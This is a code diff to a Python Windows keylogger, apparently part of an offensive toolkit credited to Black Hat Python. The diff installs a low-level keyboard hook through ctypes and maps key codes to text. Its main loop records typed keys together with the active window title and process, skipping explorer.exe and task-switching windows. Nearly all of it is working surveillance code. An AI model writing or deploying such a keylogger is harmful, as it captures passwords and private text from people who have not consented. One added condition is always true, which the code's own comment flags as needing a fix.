@@ -14,13 +14,32 @@
 # --------------------------------------------------------------
 import sys
 from ctypes import *
-from ctypes.wintypes import MSG
-from ctypes.wintypes import DWORD
+from ctypes.wintypes import MSG, DWORD, HINSTANCE, HHOOK, WPARAM, LPARAM, BOOL, LPCWSTR, HMODULE
 import threading
 import time
+import datetime
+import platform
 
-user32 = windll.user32
+
+LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
+HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, POINTER(c_void_p))
+user32=windll.user32
 kernel32 = windll.kernel32
+
+#some windows function defines :
+SetWindowsHookEx = user32.SetWindowsHookExA
+SetWindowsHookEx.restype = HHOOK
+SetWindowsHookEx.argtypes = [c_int, HOOKPROC, HINSTANCE, DWORD]
+CallNextHookEx = user32.CallNextHookEx
+CallNextHookEx.restype = LRESULT
+CallNextHookEx.argtypes = [HHOOK, c_int, WPARAM, POINTER(c_void_p)]
+UnhookWindowsHookEx = user32.UnhookWindowsHookEx
+UnhookWindowsHookEx.restype = BOOL
+UnhookWindowsHookEx.argtypes = [HHOOK]
+GetModuleHandleW=windll.kernel32.GetModuleHandleW
+GetModuleHandleW.restype = HMODULE
+GetModuleHandleW.argtypes = [LPCWSTR]
+
 WH_KEYBOARD_LL=13
 WM_KEYDOWN=0x0100
 
@@ -30,7 +49,7 @@ current_window = None
 keyCodes={
 	0x08 : "[BKSP]",
 	0x09 : "[TAB]",
-	0x0D : "\n",
+	0x0D : "[ENTER]",
 	0x10 : "[SHIFT]",
 	0x11 : "[CTRL]",
 	0x12 : "[ALT]",
@@ -44,7 +63,7 @@ keyCodes={
 	0x28 : "[DOWN]",
 	0x2C : "[PRINT_SCREEN]",
 	0x2E : "[DEL]",
-	0x90 : "[NUM_LOCk]",
+	0x90 : "[NUM_LOCK]",
 	0xA0 : "[LSHIFT]",
 	0xA1 : "[RSHIFT]",
 	0xA2 : "[LCTRL]",
@@ -59,17 +78,13 @@ class KeyLogger(threading.Thread):
 		self.hooked	 = None
 		self.daemon=True
 		self.keys_buffer=""
-		self.lUser32=user32
 		self.pointer=None
 		self.stopped=False
 
 	def run(self):
-		if self.install_hook():
-			print "keylogger installed"
-		else:
-			raise RuntimeError("couldn't install keylogger")
+		self.install_hook()
 		msg = MSG()
-		user32.GetMessageA(byref(msg),0,0,0)
+		windll.user32.GetMessageA(byref(msg),0,0,0)
 		while not self.stopped:
 			time.sleep(1)
 		self.uninstall_hook()
@@ -84,6 +99,7 @@ class KeyLogger(threading.Thread):
 
 	def convert_key_code(self, code):
 		#https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
+		code=c_long(code).value
 		if code >=0x41 and code <=0x5a: # letters
 			return chr(code)
 		elif code>=0x30 and code <=0x39: # numbers
@@ -93,27 +109,27 @@ class KeyLogger(threading.Thread):
 		elif code in keyCodes:
 			return keyCodes[code]
 		return "[%02x]"%code
-	
+
 	def install_hook(self):
-		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
-		self.pointer = CMPFUNC(self.hook_proc)
-		self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
+		self.pointer = HOOKPROC(self.hook_proc)
+		modhwd=GetModuleHandleW(None)
+		self.hooked = SetWindowsHookEx(WH_KEYBOARD_LL, self.pointer, modhwd, 0)
 		if not self.hooked:
-			return False
+			raise WinError()
 		return True
 	
 	def uninstall_hook(self):												  
 		if self.hooked is None:
 			return
-		self.lUser32.UnhookWindowsHookEx(self.hooked)
+		UnhookWindowsHookEx(self.hooked)
 		self.hooked = None
 
 	def hook_proc(self, nCode, wParam, lParam):
-		if wParam is not WM_KEYDOWN:
-			return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
+		if wParam != WM_KEYDOWN:
+			return CallNextHookEx(self.hooked, nCode, wParam, lParam)
 		hooked_key = self.convert_key_code(lParam[0])
 		self.keys_buffer+=hooked_key
-		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)	 
+		return CallNextHookEx(self.hooked, nCode, wParam, lParam)	 
 
 #credit: Black Hat Python - https://www.nostarch.com/blackhatpython
 def get_current_process():
@@ -122,7 +138,7 @@ def get_current_process():
 	pid = c_ulong(0)
 	user32.GetWindowThreadProcessId(hwnd, byref(pid))
 	
-	process_id = "%d" % pid.value
+	#process_id = "%d" % pid.value
 	
 	executable = create_string_buffer("\x00" * 512)
 	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
@@ -133,17 +149,28 @@ def get_current_process():
 	
 	kernel32.CloseHandle(hwnd)
 	kernel32.CloseHandle(h_process)
-	return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+	return executable.value, window_title.value
 
 if __name__=="__main__":
+	proc_blacklist = ['explorer.exe']
+	proc_whitelist = [] # can expand on this
+
+	title_blacklist = set(['task'])
+	title_whitelist = set([]) # can expand on this
+
 	keyLogger = KeyLogger()
 	keyLogger.start()
 	while True:
-		if keyLogger.keys_buffer == "":
-			continue
+		exe, win_title = get_current_process()
+		curr_title = set(win_title.lower().split())
+		if (exe.lower() in proc_blacklist) or (title_blacklist & curr_title):
+			keyLogger.keys_buffer = ""
+		elif keyLogger.keys_buffer == "":
+			pass
 		else:
-			curr_proc = get_current_process()
-			if current_window != curr_proc:
-				print keyLogger.dump()
-				current_window = curr_proc
-				print current_window
+			curr_title = get_current_process()[1]
+			if current_window != curr_title:
+				if (current_window != '') or (current_window != 'Task Switching'):
+					print datetime.datetime.now(),curr_title,current_window #this part annoying, and needs a fix
+					print keyLogger.dump()
+					current_window = curr_title
